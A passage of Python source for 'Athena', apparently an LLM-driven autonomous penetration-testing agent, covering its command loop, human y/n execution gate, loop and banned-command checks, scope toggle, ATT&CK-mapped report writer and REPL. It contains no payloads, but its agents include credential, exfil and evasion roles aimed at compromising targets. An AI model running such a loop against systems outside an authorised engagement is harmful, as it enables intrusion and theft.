                    new_obj = line.split('.', 1)[1].strip()
                    print(f"\033[32m   Pursuing: {new_obj}\033[0m")
                    # Mark current as dead-end so we don't loop back
                    if active:
                        self.ptt.set_status(active.nid, "dead_end")
                    self._agent_loop(new_obj)
                    return
        elif choice:
            self._agent_loop(choice)

    # ── Main agent loop ──────────────────────────────────────────

    def _agent_loop(self, initial_prompt: str,
                    workflow_key: Optional[str] = None):
        prompt = initial_prompt
        self.current_workflow_key = workflow_key
        self.stuck_counter = 0
        # Track success per node so workflow can't auto-complete a
        # streak of failures (v7.2 fix).
        self._node_success_count: Dict[str, int] = {}

        while True:
            # v7.2 — turn header is now drawn by turn_box() inside
            # think_turn(); no inline header needed here.
            active = self.ptt.find_in_progress() or self.ptt.find_next_pending()

            # v7.2 — if a previous turn produced a hard dispatch error,
            # splice it into the prompt so the LLM sees its own mistake
            # and can correct.  Without this the loop just kept emitting
            # the same kwargs and getting silently dropped.
            pending_err = getattr(self, "_pending_dispatch_error_to_prompt", None)
            if pending_err:
                prompt = (
                    f"DISPATCH ERROR FROM YOUR PREVIOUS TURN:\n"
                    f"{pending_err}\n\n"
                    f"Re-issue with corrected args, switch tools, or "
                    f"use [CMD]. Original task:\n{prompt}"
                )
                self._pending_dispatch_error_to_prompt = None

            parsed = self.think_turn(prompt, workflow_key=workflow_key)
            cmd     = parsed["cmd"]
            conf    = parsed["conf"]
            verify  = parsed["verify"]
            handoff = parsed["handoff"]

            # v7.2 — propagate any fresh dispatch error from think_turn
            # into the next iteration of this loop.
            if getattr(self, "_pending_dispatch_error", None):
                self._pending_dispatch_error_to_prompt = self._pending_dispatch_error
                self._pending_dispatch_error = None

            if cmd is None:
                # v7.1 — instead of bailing, retry up to 2x with a
                # corrective hint.  This recovers from tool-dispatch
                # failures and from the LLM accidentally omitting [CMD].
                no_cmd_retries = getattr(self, "_no_cmd_retries", 0)
                if no_cmd_retries < 2:
                    self._no_cmd_retries = no_cmd_retries + 1
                    say_warn("Agent did not output a [CMD] block — asking again.")
                    prompt = (
                        "Your previous response had no executable command. "
                        "Output a SINGLE [CMD]…[/CMD] line (or [TOOL]…[/TOOL]"
                        "[ARGS]…[/ARGS]) plus [THOUGHT][CONF].  If your "
                        "preferred tool isn't in the structured registry or "
                        "its dispatch failed, fall back to [CMD] with the "
                        "raw shell command."
                    )
                    continue
                else:
                    self._no_cmd_retries = 0
                    say_err("Still no command after 2 retries — bailing.")
                    break
            else:
                self._no_cmd_retries = 0  # reset on success

            # Workflow done check — v7.2 GATED on actual progress
            if WORKFLOW_DONE in cmd.upper() or "WORKFLOW_COMPLETE" in cmd.upper():
                # v7.2 — refuse to auto-complete a node that has zero
                # successful commands AND zero findings.  The LLM can
                # try to bail out of failures with WORKFLOW_COMPLETE;
                # this gate stops that.
                node_findings = 0
                node_successes = 0
                if active:
                    node_findings = len(active.findings)
                    node_successes = self._node_success_count.get(active.nid, 0)
                if active and node_findings == 0 and node_successes == 0:
                    say_warn(f"Refusing WORKFLOW_COMPLETE on node "
                             f"[{active.nid}] — 0 findings, 0 successful "
                             f"commands. Try a different approach.")
                    prompt = (
                        f"You proposed WORKFLOW_COMPLETE but node "
                        f"[{active.nid}] {active.title} has produced no "
                        f"successful commands and no findings yet. "
                        f"You may not skip a node that hasn't yielded "
                        f"any data. Take a fundamentally different "
                        f"approach (different tool, different angle), "
                        f"or [HANDOFF]<other_agent>[/HANDOFF] to escalate."
                    )
                    continue

                if active:
                    self.ptt.set_status(active.nid, "done")
                # Check if we have more pending nodes
                nxt = self.ptt.find_next_pending()
                if nxt:
                    print()
                    print(_box(
                        "✓ NODE COMPLETE",
                        [f"  Moving to: \033[97m[{nxt.nid}] {nxt.title}\033[0m"],
                        color="32"))
                    self.ptt.set_status(nxt.nid, "in_progress")
                    prompt = (f"Previous node complete.  "
                              f"Now work on: {nxt.title} (phase: {nxt.phase}). "
                              f"Output [THOUGHT][CMD][CONF].")
                    continue
                else:
                    print()
                    print(_box(
                        "✓ WORKFLOW COMPLETE",
                        [f"  All nodes done. \033[32m{len(self.ptt.get_verified())}"
                         f"\033[0m verified findings, "
                         f"\033[33m{len(self.ptt.get_unverified())}\033[0m unverified."],
                        color="32"))
                    self._log("[WORKFLOW DONE]")
                    break

            # Handoff request
            if handoff and handoff in AGENT_SPECS:
                print()
                print(_box(
                    "↪ HANDOFF",
                    [f"  → {AGENT_SPECS[handoff]['icon']} "
                     f"{AGENT_SPECS[handoff]['name']}"],
                    color="33"))
                # Add a sibling node for the handoff phase if reasonable
                if active and active.parent_id:
                    self.ptt.add_node(active.parent_id,
                                      f"Handoff to {handoff}",
                                      handoff, status="todo")

            # Banned check
            if self._is_banned(cmd):
                print()
                print(error_alert(
                    "BANNED COMMAND BLOCKED",
                    f"`{cmd}` would change UI / system packages.",
                    hint="Use `which`/`dpkg -l` to check tools instead. "
                         "apt upgrade variants are permanently disabled."))
                prompt = ("That apt upgrade variant is blocked.  Use which "
                          "or dpkg -l to check tools.  Provide alternative "
                          "with [THOUGHT][CMD][CONF].")
                continue

            # v7.2 — Track command for repeat detection.  More aggressive
            # than v7.1: ANY exact repeat in the last 5 commands triggers
            # a forced agent rotation + RED conf override.  This stops
            # the loop where dropped kwargs produced identical shells.
            cmd_norm = re.sub(r'\s+', ' ', cmd.strip().lower())
            if cmd_norm in self.command_history[-5:]:
                print()
                print(error_alert(
                    "LOOP DETECTED",
                    f"You just ran this exact command. Repeating means the "
                    f"previous result didn't change anything you can act on.",
                    hint="Forcing pivot to a different approach now."))
                self.stuck_counter += 1
                if active:
                    self.ptt.increment_attempts(active.nid)
                    self.ptt.set_confidence(active.nid, "red")
                if self.stuck_counter >= STUCK_THRESHOLD:
                    self.stuck_counter = 0
                    self._handle_stuck()
                    break
                # v7.2 — give the LLM stronger guidance: name the command,
                # require a *different category* of approach, and bump
                # the agent if possible.
                rotation_hint = ""
                if self.current_agent == "recon":
                    rotation_hint = " Switch from scanning to direct service interaction (whatweb, curl, nxc, smbclient)."
                elif self.current_agent == "web":
                    rotation_hint = " Switch from brute/fuzz to manual probing (curl with payloads) or pivot to network agent."
                prompt = (
                    f"LOOP-BREAKER: you already ran `{cmd}`. The result "
                    f"didn't help. Take a FUNDAMENTALLY DIFFERENT approach: "
                    f"different tool, different angle, different "
                    f"specialist.{rotation_hint} Output [THOUGHT][CMD][CONF]. "
                    f"You may [HANDOFF]<other_agent>[/HANDOFF] to escalate."
                )
                continue

            self.command_history.append(cmd_norm)
            if len(self.command_history) > 25:
                self.command_history = self.command_history[-25:]

            # Confidence handling — the pill already shows in think_turn()
            if conf == "red":
                print()
                print(_box("RED CONFIDENCE — execution skipped",
                           ["  Asking AI for recon to gather missing "
                            "context first."], color="31"))
                prompt = ("Confidence was RED.  Propose a recon command to "
                          "gather the missing context, not the attack.  "
                          "[THOUGHT][CMD][CONF].")
                continue

            # Execute the command (always y/n gated)
            if active:
                self.ptt.increment_attempts(active.nid)
                self.ptt.set_last_cmd(active.nid, cmd)
            output = self.run_command(cmd)

            if output == EXEC_SESSION_EXIT:
                print()
                say_athena("Session ended by The Priest.")
                self._generate_report()
                if self.logfile:
                    self.logfile.close()
                sys.exit(0)

            if output == EXEC_INTERACTIVE_BLOCKED:
                _, fix = self._is_interactive(cmd)
                prompt = (f"That command would hijack the terminal.  {fix}  "
                          f"Provide non-interactive alternative.  "
                          f"[THOUGHT][CMD][CONF].")
                continue

            if output == EXEC_DESTRUCTIVE:
                prompt = ("That command was destructive and refused.  "
                          "Propose a non-destructive alternative.  "
                          "[THOUGHT][CMD][CONF].")
                continue

            if output == EXEC_REJECTED:
                self.stuck_counter += 1
                if active:
                    if active.attempts >= NODE_ATTEMPT_LIMIT:
                        self.ptt.set_status(active.nid, "dead_end")
                        print()
                        print(_box(
                            "✗ DEAD END",
                            [f"  Node [{active.nid}] {active.title}",
                             f"  Marked dead-end after {active.attempts} attempts."],
                            color="31"))
                if self.stuck_counter >= STUCK_THRESHOLD:
                    self.stuck_counter = 0
                    self._handle_stuck()
                    break

                try:
                    print()
                    say_athena("Alternative approach?", indent=3)
                    raw = input(f"   {kbd('y')} yes   {kbd('n')} no  › ")
                except (EOFError, KeyboardInterrupt):
                    break
                if self._normalize_choice(raw) == "y":
                    prompt = ("The Priest rejected that.  Different approach "
                              "to same goal.  [THOUGHT][CMD][CONF].")
                    continue
                else:
                    break

            # v7.2 — record a successful exec for this node (used by
            # the WORKFLOW_COMPLETE gate above).  We count any non-error
            # return from run_command as a success at the framework
            # level — even if the tool found nothing, the LLM at least
            # got real output to reason from.
            self.stuck_counter = 0
            if active:
                self._node_success_count[active.nid] = (
                    self._node_success_count.get(active.nid, 0) + 1)

            # v7.1 — flush any queued credential fanout work into PTT
            self._flush_cred_fanout()

            # Optional verification
            if verify:
                print()
                print(_box(
                    "PoC VERIFICATION",
                    ["  Agent proposed a verification command — "
                     "running through y/n gate."],
                    color="33"))
                # Try to figure out which finding it's verifying — pick the
                # most recent unverified finding from this node
                if active:
                    candidates = [self.ptt.findings[fid - 1] for fid in active.findings
                                  if fid - 1 < len(self.ptt.findings)]
                else:
                    candidates = []
                target_finding = None
                for f in candidates:
                    if not f.verified:
                        target_finding = f
                        break
                if target_finding is None and self.ptt.get_unverified():
                    target_finding = self.ptt.get_unverified()[-1]

                if target_finding:
                    self.attempt_verification(verify,
                                              target_finding.value,
                                              target_finding.ftype)
                else:
                    # Just run the verify command standalone
                    self.run_command(verify, label="VERIFY")

            # Build pivot prompt with fresh context
            pivot_lines = []
            f_dict = self.ptt.findings_by_type_dict(only_verified=True)
            if f_dict:
                pivot_lines.append("VERIFIED FINDINGS:")
                for k, vs in f_dict.items():
                    pivot_lines.append(f"  {k.upper()}: {', '.join(vs[-4:])}")
            unv = self.ptt.get_unverified()
            if unv:
                u_dict: Dict[str, List[str]] = {}
                for f in unv[-15:]:
                    u_dict.setdefault(f.ftype, []).append(f.value)
                pivot_lines.append("UNVERIFIED CANDIDATES:")
                for k, vs in u_dict.items():
                    pivot_lines.append(f"  {k.upper()}: {', '.join(vs)}")
            pivot = "\n".join(pivot_lines)

            prompt = (
                f"TERMINAL OUTPUT:\n{output}\n\n"
                f"{pivot}\n\n"
                "Analyse with elite reasoning in [THOUGHT].  Pivot on "
                "verified findings.  WORKFLOW_COMPLETE if current node "
                "is done; else next [CMD].  Always include [CONF]."
            )

    # ── Workflow runner ───────────────────────────────────────────

    def _resolve_target(self) -> str:
        target = (self.target_info.get("ip") or
                  self.target_info.get("domain") or "")
        if not target:
            try:
                target = input("\033[90m   Enter target: \033[0m").strip()
            except (EOFError, KeyboardInterrupt):
                target = ""
        return target

    def run_workflow(self, key: str):
        wf = WORKFLOWS.get(key)
        if not wf:
            return
        target = self._resolve_target()
        if not target:
            print("\033[31m   No target.\033[0m")
            return

        print()
        say_athena(f"Workflow: {wf['name']}")
        print()
        self._log(f"[WORKFLOW] {wf['name']}")
        self._seed_ptt_from_workflow(key, target)
        print(self.ptt.to_terminal())
        print()

        prompt = (f"Workflow: {wf['name']}\nTarget: {target}\n\n"
                  f"Walk the PTT one node at a time.  For each node, output "
                  f"[THOUGHT][CMD][CONF].  Mark WORKFLOW_COMPLETE when the "
                  f"current node is done; the system will move you to the next.")
        self._agent_loop(prompt, workflow_key=key)

    def show_workflow_menu(self):
        print(f"\n{header_box('  WORKFLOW MENU  ', color='35')}\n")
        for k, wf in WORKFLOWS.items():
            print(f"   \033[97m[{k:>2}]\033[0m  {wf['name']}")
            print(f"          \033[90m{wf['description']}\033[0m")
        print(f"\n   \033[97m[ 0]\033[0m  Cancel\n")
        try:
            choice = input("\033[90m   Select: \033[0m").strip()
        except (EOFError, KeyboardInterrupt):
            return
        if choice in WORKFLOWS:
            self.run_workflow(choice)
        elif choice != "0":
            print("\033[33m   Invalid.\033[0m")

    # ── Findings / Tree display ──────────────────────────────────

    def show_findings(self):
        if not self.ptt.findings:
            print("\n\033[90m   No findings yet.\033[0m\n")
            return

        verified = self.ptt.get_verified()
        unverified = self.ptt.get_unverified()

        print(f"\n{header_box('  FINDINGS  ', color='32')}")
        if verified:
            print(f"\n\033[32m   VERIFIED ({len(verified)}):\033[0m")
            for f in verified:
                print(finding_card(f))
        if unverified:
            print(f"\n\033[33m   UNVERIFIED ({len(unverified)}):\033[0m")
            for f in unverified:
                print(finding_card(f))
        print()

    def show_tree(self):
        print(f"\n{header_box('  PENTESTING TASK TREE  ', color='35')}\n")
        print(self.ptt.to_terminal())
        print()
        print(f"  \033[90mLegend:\033[0m  "
              f"○ todo  \033[33m◐\033[0m in_progress  "
              f"\033[32m●\033[0m done  \033[31m✗\033[0m dead-end  "
              f"\033[90m─\033[0m skipped")
        print()

    # ── Report generation (with cleanup pass) ───────────────────

    def _llm_cleanup_pass(self) -> str:
        """Ask the AI to write a clean report from verified findings only.
        This is called at report-generation time.  Returns a markdown body.
        Falls through to a plain dump if the LLM is unavailable.
        """
        verified = self.ptt.get_verified()
        if not verified and not self.ptt.findings:
            return "No findings to report."

        # Prepare context for the LLM
        v_summary = []
        for f in verified:
            v_summary.append(
                f"- {f.ftype}: {f.value} "
                f"(node {f.node_id}, source: `{f.source_cmd[:80]}`)"
            )

        u_summary = []
        for f in self.ptt.get_unverified():
            u_summary.append(f"- {f.ftype}: {f.value} (UNVERIFIED, node {f.node_id})")

        target = (self.target_info.get("ip") or
                  self.target_info.get("domain") or "Unknown")

        sys_prompt = (
            "You are Athena's Reporter agent.  You write professional "
            "penetration test reports.  Be concise, factual.  Use "
            "Markdown headers.  Include CVSS rating where applicable.  "
            "Never invent findings — only use what is provided.  "
            "Drop unverified findings unless they are clearly part of "
            "the attack chain context."
        )

        user_prompt = (
            f"Target: {target}\n"
            f"Mission: {self.target_info.get('notes') or '—'}\n\n"
            f"VERIFIED FINDINGS:\n" + ("\n".join(v_summary) or "(none)") +
            "\n\nUNVERIFIED FINDINGS (mention only if they connect to verified):\n" +
            ("\n".join(u_summary) or "(none)") +
            "\n\nWrite a report with sections:\n"
            "## Executive Summary\n"
            "## Confirmed Findings (with CVSS where applicable)\n"
            "## Attack Chain Analysis\n"
            "## Remediation Recommendations\n"
            "## Appendix: Tooling & Methodology"
        )

        response = self._think_with_fallback([
            {"role": "system", "content": sys_prompt},
            {"role": "user", "content": user_prompt},
        ], max_tokens=2048)

        if not response:
            return self._fallback_report_body()
        return response

    def _fallback_report_body(self) -> str:
        lines = ["## Findings\n"]
        verified = self.ptt.get_verified()
        if verified:
            lines.append("### Verified")
            for f in verified:
                lines.append(f"- **{f.ftype}**: `{f.value}` "
                             f"(source: `{f.source_cmd[:100]}`)")
        unv = self.ptt.get_unverified()
        if unv:
            lines.append("\n### Unverified Candidates")
            for f in unv:
                lines.append(f"- **{f.ftype}**: `{f.value}`")
        return "\n".join(lines)

    def _generate_report(self):
        ts = datetime.datetime.now()
        duration = ts - self.session_start
        rpath = os.path.join(
            LOG_DIR,
            f"report_{self.session_start.strftime('%Y%m%d_%H%M%S')}.md"
        )
        target = " | ".join(filter(None, [
            self.target_info.get("ip", ""),
            self.target_info.get("domain", "")
        ]))

        # Get LLM-generated body
        body = self._llm_cleanup_pass()

        # v7.1 — MITRE ATT&CK section: techniques exercised + findings grouped
        mitre_section = self._build_mitre_section()

        # v7.1 — token savings estimate
        savings_line = ""
        if self.context_mgr.tokens_saved_estimate > 0:
            savings_line = (f"- **Tokens saved (smart context):** "
                          f"~{self.context_mgr.tokens_saved_estimate:,}\n")

        try:
            with open(rpath, "w") as f:
                f.write(f"# ATHENA v{VERSION} REPORT\n\n")
                f.write(f"- **Target:** {target or 'Not set'}\n")
                f.write(f"- **Mission:** {self.target_info.get('notes') or '—'}\n")
                f.write(f"- **Operator:** The Priest\n")
                f.write(f"- **Started:** {self.session_start.isoformat(timespec='seconds')}\n")
                f.write(f"- **Duration:** {str(duration).split('.')[0]}\n")
                f.write(f"- **LHOST:** {self.lhost}\n")
                f.write(f"- **Scope enforced:** {'yes' if self.scope.enabled else 'no'}\n")
                f.write(savings_line)
                f.write(f"\n---\n\n")
                f.write(body)
                f.write(f"\n\n---\n\n")
                f.write(mitre_section)
                f.write(f"\n\n---\n\n")
                f.write(f"## Pentesting Task Tree (Final State)\n\n```\n")
                f.write(self.ptt.to_natural_language(max_chars=8000))
                f.write(f"\n```\n\n")
                f.write(f"## Attack Graph Summary\n\n```\n")
                f.write(self.graph.to_compact_text(max_chars=4000))
                f.write(f"\n```\n\n")
                f.write(f"## Raw Findings (with provenance + ATT&CK)\n\n")
                for fnd in self.ptt.findings:
                    mark = "✓" if fnd.verified else "?"
                    attack = (f" `{fnd.attack_id} {fnd.attack_name}`"
                              if fnd.attack_id else "")
                    f.write(f"- [{mark}] **{fnd.ftype}** = `{fnd.value}` "
                            f"(node {fnd.node_id}, ts {fnd.timestamp}){attack}\n")
                    f.write(f"  - source: `{fnd.source_cmd[:200]}`\n")
                f.write(f"\n---\n*Generated by Athena v{VERSION}*\n")
            print(f"\n\033[32m   ✓ Report: {rpath}\033[0m")
        except Exception as e:
            print(f"\033[33m   Report failed: {e}\033[0m")

    def _build_mitre_section(self) -> str:
        """v7.1 — MITRE ATT&CK Navigator-friendly section: techniques
        exercised, findings grouped by technique."""
        lines = ["## MITRE ATT&CK Coverage\n"]

        # Techniques exercised (from commands run)
        if self.attack_techniques_used:
            lines.append("### Techniques Exercised\n")
            lines.append("| ID | Technique | Tactic | Times |")
            lines.append("|----|-----------|--------|-------|")
            # Sort by tactic, then by count desc
            sorted_techs = sorted(
                self.attack_techniques_used.items(),
                key=lambda x: (x[1]["tactic"], -x[1]["count"]),
            )
            for tid, info in sorted_techs:
                lines.append(f"| {tid} | {info['name']} | "
                             f"{info['tactic']} | {info['count']} |")
            lines.append("")
        else:
            lines.append("_No ATT&CK techniques recorded._\n")

        # Findings grouped by technique
        by_tech: Dict[str, List[Finding]] = {}
        for fnd in self.ptt.findings:
            if fnd.attack_id:
                by_tech.setdefault(fnd.attack_id, []).append(fnd)

        if by_tech:
            lines.append("### Findings by Technique\n")
            for tid in sorted(by_tech.keys()):
                fs = by_tech[tid]
                first = fs[0]
                lines.append(f"#### {tid} — {first.attack_name} "
                             f"_({first.attack_tactic})_")
                for fnd in fs:
                    mark = "✓" if fnd.verified else "?"
                    lines.append(f"- [{mark}] {fnd.ftype}: `{fnd.value}`")
                lines.append("")

        return "\n".join(lines)

    def save_session(self):
        ts = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        path = os.path.join(LOG_DIR, f"save_{ts}.txt")
        try:
            with open(path, "w") as f:
                f.write(f"ATHENA SAVE {ts}\n{'='*60}\n\n")
                for msg in self.history:
                    f.write(f"[{msg['role'].upper()}]\n{msg['content']}\n\n")
            print(f"\033[32m   Saved: {path}\033[0m")
        except Exception as e:
            print(f"\033[31m   Save failed: {e}\033[0m")

    # ── Help, status, tool status ─────────────────────────────────

    def show_model_status(self):
        print(f"\n{header_box('  PROVIDER CHAIN  ', color='35')}\n")
        for i, (model_id, name) in enumerate(PROVIDER_CHAIN):
            mark = "\033[32m▶ ACTIVE\033[0m" if i == self.provider_index else "      "
            print(f"   {mark}  [{i+1}]  \033[97m{name:<22}\033[0m  "
                  f"\033[90m{model_id}\033[0m")
        print()

    def show_tools_status(self):
        print(f"\n{header_box('  KALI ARSENAL — AVAILABILITY  ', color='35')}\n")
        all_tools = all_kali_tools_flat()
        # Cache lookups
        for t in all_tools:
            if t not in self.tools_available:
                self.tools_available[t] = cmd_exists(t)

        # Group by category, show install state
        for cat, tools in KALI_TOOLS.items():
            present = [t for t in tools if self.tools_available.get(t)]
            missing = [t for t in tools if not self.tools_available.get(t)]
            print(f"\n   \033[97m{cat.upper()}\033[0m  "
                  f"\033[32m{len(present)}\033[0m / "
                  f"\033[97m{len(tools)}\033[0m available")
            if present:
                print(f"     \033[32m✓\033[0m {', '.join(present[:8])}"
                      + (f" \033[90m+{len(present)-8} more\033[0m" if len(present) > 8 else ""))
            if missing:
                print(f"     \033[31m✗\033[0m {', '.join(missing[:8])}"
                      + (f" \033[90m+{len(missing)-8} more\033[0m" if len(missing) > 8 else ""))
        print()

        all_missing = [t for t, p in self.tools_available.items() if not p]
        if all_missing:
            try:
                ans = input(f"\033[33m   Install {len(all_missing)} missing tools? [y/n]: \033[0m")
            except (EOFError, KeyboardInterrupt):
                return
            if self._normalize_choice(ans) == "y":
                for t in all_missing:
                    install_if_missing(t)
                    self.tools_available[t] = cmd_exists(t)

    def show_scope(self):
        """v7.1 — display scope / RoE config; allow toggle."""
        print(f"\n{header_box('  ENGAGEMENT SCOPE / RoE  ', color='33')}\n")
        print(f"   {self.scope.summary()}")
        print(f"\n   \033[90mFile: {SCOPE_FILE}\033[0m")
        print(f"   \033[90mEdit that file to set CIDRs, domains, time windows.\033[0m\n")
        try:
            choice = input("   Toggle scope enabled? [y/N]: ").strip().lower()
        except (EOFError, KeyboardInterrupt):
            print()
            return
        if choice == "y":
            self.scope.enabled = not self.scope.enabled
            try:
                with open(SCOPE_FILE, "r") as f:
                    data = json.load(f)
            except Exception:
                data = dict(DEFAULT_SCOPE)
            data["enabled"] = self.scope.enabled
            try:
                with open(SCOPE_FILE, "w") as f:
                    json.dump(data, f, indent=2)
            except Exception as e:
                print(f"   \033[33m   Save failed: {e}\033[0m")
            state = ("\033[32menabled\033[0m" if self.scope.enabled
                     else "\033[90mdisabled\033[0m")
            print(f"   Scope is now {state}\n")

    def show_graph(self):
        """v7.1 — display attack graph state."""
        print(f"\n{header_box('  ATTACK GRAPH  ', color='36')}\n")
        if not HAS_NETWORKX:
            print("   \033[33m   networkx not installed.  "
                  "pip install networkx --break-system-packages\033[0m\n")
            return
        print(f"   {self.graph.summary()}\n")
        compact = self.graph.to_compact_text(max_chars=4000)
        for line in compact.split("\n")[1:]:  # skip the summary line
            print(f"   {line}")
        print()
        sugg = self.graph.pivot_suggestions()
        if sugg:
            print(f"   \033[33m\033[1mPIVOT HINTS:\033[0m")
            for s in sugg:
                print(f"     \033[33m›\033[0m {s}")
        print()

    def show_mitre(self):
        """v7.1 — display ATT&CK techniques exercised this session."""
        print(f"\n{header_box('  MITRE ATT&CK COVERAGE  ', color='31')}\n")
        if not self.attack_techniques_used:
            print("   \033[90m   No ATT&CK techniques recorded yet.\033[0m\n")
            return
        # Group by tactic
        by_tactic: Dict[str, List[Tuple[str, Dict[str, Any]]]] = {}
        for tid, info in self.attack_techniques_used.items():
            by_tactic.setdefault(info["tactic"], []).append((tid, info))
        for tactic in sorted(by_tactic.keys()):
            print(f"   \033[31m\033[1m{tactic}\033[0m")
            for tid, info in sorted(by_tactic[tactic],
                                     key=lambda x: -x[1]["count"]):
                print(f"     \033[97m{tid}\033[0m  {info['name']:<42} "
                      f"\033[90m×{info['count']}\033[0m")
            print()
        total = sum(i["count"] for i in self.attack_techniques_used.values())
        print(f"   \033[90m   {len(self.attack_techniques_used)} unique technique(s), "
              f"{total} total invocation(s)\033[0m\n")

    def show_dashboard(self):
        """v7.1 — concise session status panel."""
        v_count = len(self.ptt.get_verified())
        u_count = len(self.ptt.get_unverified())
        nodes_done = sum(1 for n in self.ptt.nodes.values() if n.status == "done")
        nodes_total = len(self.ptt.nodes)
        target = (self.target_info.get("ip") or
                  self.target_info.get("domain") or "—")
        elapsed = datetime.datetime.now() - self.session_start
        elapsed_str = str(elapsed).split(".")[0]
        scope_state = ("\033[32mON\033[0m" if self.scope.enabled
                       else "\033[90moff\033[0m")
        print(f"\n{header_box('  SESSION DASHBOARD  ', color='35')}\n")
        print(f"   \033[97mTarget       :\033[0m {target}")
        print(f"   \033[97mElapsed      :\033[0m {elapsed_str}")
        print(f"   \033[97mAgent        :\033[0m {AGENT_SPECS[self.current_agent]['icon']} "
              f"{AGENT_SPECS[self.current_agent]['name']}")
        print(f"   \033[97mModel        :\033[0m {self._current_model_name()}")
        print(f"   \033[97mPTT progress :\033[0m {nodes_done}/{nodes_total} nodes done")
        print(f"   \033[97mFindings     :\033[0m \033[32m{v_count}\033[0m verified, "
              f"\033[33m{u_count}\033[0m unverified")
        print(f"   \033[97mATT&CK techs :\033[0m {len(self.attack_techniques_used)} unique")
        print(f"   \033[97mGraph        :\033[0m {self.graph.summary()}")
        print(f"   \033[97mScope (RoE)  :\033[0m {scope_state}")
        if self.context_mgr.tokens_saved_estimate > 0:
            print(f"   \033[97mTokens saved :\033[0m "
                  f"~{self.context_mgr.tokens_saved_estimate:,} (smart context)")
        print()

    def show_help(self):
        print(
            f"\n   \033[35m\033[1mATHENA v{VERSION}\033[0m"
            f"   \033[90mby The Priest\033[0m\n"
            f"   Model      : \033[97m{self._current_model_name()}\033[0m\n"
            f"   LHOST      : \033[97m{self.lhost}\033[0m\n"
            f"   Agents     : \033[97m{len(AGENT_SPECS)}\033[0m  "
            f"(strategist, recon, web, network, ad, linux/win privesc, "
            f"credential, exfil, evasion, reporter)\n"
            f"   Workflows  : \033[97m{len(WORKFLOWS)}\033[0m\n"
            f"   Tools      : \033[97m{len(all_kali_tools_flat())}\033[0m  registered, "
            f"\033[97m{len(TOOL_DISPATCH)}\033[0m structured\n"
            f"   Scope RoE  : \033[97m{'enabled' if self.scope.enabled else 'disabled'}\033[0m\n"
            f"   Graph      : \033[97m{'on' if HAS_NETWORKX else 'off (pip install networkx)'}\033[0m\n\n"
            "   \033[97mworkflow\033[0m  open the workflow menu\n"
            "   \033[97mtarget\033[0m    set or update target\n"
            "   \033[97mfindings\033[0m  show extracted findings (verified + unverified)\n"
            "   \033[97mtree\033[0m      show the Pentesting Task Tree\n"
            "   \033[97mgraph\033[0m     show the attack graph state\n"
            "   \033[97mscope\033[0m     show / toggle engagement scope (RoE)\n"
            "   \033[97mmitre\033[0m     show ATT&CK techniques used this session\n"
            "   \033[97mtools\033[0m     show tool availability + auto-install missing\n"
            "   \033[97mmodel\033[0m     show provider chain status\n"
            "   \033[97magent\033[0m     show all agent specialists\n"
            "   \033[97msave\033[0m      save conversation to file\n"
            "   \033[97mreport\033[0m    generate report now\n"
            "   \033[97mclear\033[0m     clear AI memory (PTT preserved)\n"
            "   \033[97mreset\033[0m     reset everything (PTT + findings + history)\n"
            "   \033[97mhelp\033[0m      this menu\n"
            "   \033[97mexit/q\033[0m    end session + report\n\n"
            "   \033[90mOr type any objective in plain English.\033[0m\n"
        )

    def show_agents(self):
        print(f"\n{header_box('  SPECIALIST AGENTS  ', color='35')}\n")
        for role, spec in AGENT_SPECS.items():
            print(f"   \033[{spec['color']}m{spec['icon']}  "
                  f"{spec['name']:<32}\033[0m  \033[90m({role})\033[0m")
        print()

    # ── REPL ──────────────────────────────────────────────────────

    def repl(self):
        # v7.1 — cinematic boot
        print(BANNER)
        for ln in boot_sequence_lines():
            print(ln)
            time.sleep(0.04)
        print()
        print(speakers_legend())
        print()
        self.set_target()
        self.show_help()

        while True:
            # v7.1 — render persistent status bar above each prompt
            target = (self.target_info.get("ip") or
                      self.target_info.get("domain") or "no-target")
            print()
            print(status_bar(
                target=target,
                agent=self.current_agent,
                model=self._current_model_name(),
                verified=len(self.ptt.get_verified()),
                unverified=len(self.ptt.get_unverified()),
                techniques=len(self.attack_techniques_used),
                scope_on=self.scope.enabled,
            ))
            try:
                user_input = input("\033[35m\033[1m  ⚔ priest \033[0m"
                                    "\033[35m›\033[0m ").strip()
            except (EOFError, KeyboardInterrupt):
                print()
                say_athena("Session ended.")
                self._generate_report()
                if self.logfile:
                    self.logfile.close()
                break

            if not user_input:
                continue

            self._log(f"[PRIEST] {user_input}")
            cmd = user_input.lower()

            if cmd in ("exit", "quit", "q"):
                print()
                say_athena("Generating report...")
                self._generate_report()
                if self.logfile:
                    self.logfile.close()
                break
            elif cmd == "help":
                self.show_help()
            elif cmd == "workflow":
                self.show_workflow_menu()
            elif cmd == "target":
                self.set_target()
            elif cmd == "findings":
                self.show_findings()
            elif cmd == "tree":
                self.show_tree()
            elif cmd == "tools":
                self.show_tools_status()
            elif cmd == "model":
                self.show_model_status()
            elif cmd == "agent" or cmd == "agents":
                self.show_agents()
            elif cmd == "save":
                self.save_session()
            elif cmd == "report":
                self._generate_report()
            elif cmd == "clear":
                self.history.clear()
                self.command_history.clear()
                self.current_workflow_key = None
                say_athena("AI memory cleared.  PTT and findings preserved.")
            elif cmd == "reset":
                self.history.clear()
                self.command_history.clear()
                self.current_workflow_key = None
                goal = "Compromise " + (self.target_info.get("ip") or
                                         self.target_info.get("domain") or "target")
                self.ptt = PTT(goal=goal)
                self.graph = AttackGraph()
                self.attack_techniques_used.clear()
                self.cred_fanout_queue.clear()
                self.context_mgr = ContextManager()
                self.stuck_counter = 0
                # v7.1 — wipe in-memory sudo password on reset
                self._sudo_password = None
                self._sudo_skip_session = False
                say_athena("Full reset.  Fresh PTT, graph, sudo cache wiped, "
                           "no findings, no history.")
            elif cmd == "scope":
                self.show_scope()
            elif cmd == "graph":
                self.show_graph()
            elif cmd == "mitre" or cmd == "attack":
                self.show_mitre()
            elif cmd in ("status", "dashboard", "stat"):
                self.show_dashboard()
            else:
                self._agent_loop(user_input, workflow_key=None)


# ═════════════════════════════════════════════════════════════════════
# BANNER
# ═════════════════════════════════════════════════════════════════════

# Build the banner programmatically so colour escapes are unambiguous
# and we never lose them through editor copies.
def _build_banner() -> str:
    M  = "\033[35m"   # magenta frame
    W  = "\033[97m"   # bright white logo
    G  = "\033[90m"   # grey detail
    C  = "\033[36m"   # cyan accent
    Y  = "\033[33m"   # yellow accent
    B  = "\033[1m"    # bold
    R  = "\033[0m"    # reset
    KB = "\033[100m\033[97m"  # keycap inverse
    L  = lambda s: f"{M}│{R} {s}"

    lines = [
        "",
        f"{M}╭─────────────────────────────────────────────────────────────────╮{R}",
        L(f"{' '*65}") + f"{M}│{R}",
